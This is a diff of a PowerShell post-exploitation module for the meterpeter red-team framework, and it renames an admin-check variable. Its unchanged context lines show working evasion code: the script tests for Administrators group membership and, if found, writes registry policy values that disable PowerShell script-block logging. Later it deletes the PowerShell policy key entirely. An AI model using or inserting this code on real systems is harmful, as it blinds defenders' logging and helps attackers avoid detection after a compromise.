@@ -88,7 +88,7 @@ If(-not($param1) -or $param1 -eq $null){
 }
 
 ## CompDefault meterpeter post-module banner
-$CheckClientPrivs = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 Write-Host "`nCompDefault v1.2 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
 Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400
 
@@ -132,7 +132,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    }
 
    ## Disable AMSI ScriptBlockLogging (IF found admin shell)
-   If($CheckClientPrivs -eq $True){
+   If($IsClientAdmin -eq $True){
       Write-Host "[ ] Admin     => Disable AMSI ScriptBlockLogging." -ForeGroundColor Green;Start-Sleep -Milliseconds 400
       New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force -EA SilentlyContinue|Out-Null
       Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value "0" -Type "DWORD" -Force -EA SilentlyContinue|Out-Null
@@ -279,7 +279,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 }
 
 ## Revert ScriptBlockLogging (default)
-If($CheckClientPrivs -eq $True){
+If($IsClientAdmin -eq $True){
    If(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"){
       Remove-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Recurse -Force -EA SilentlyContinue|Out-Null
    }
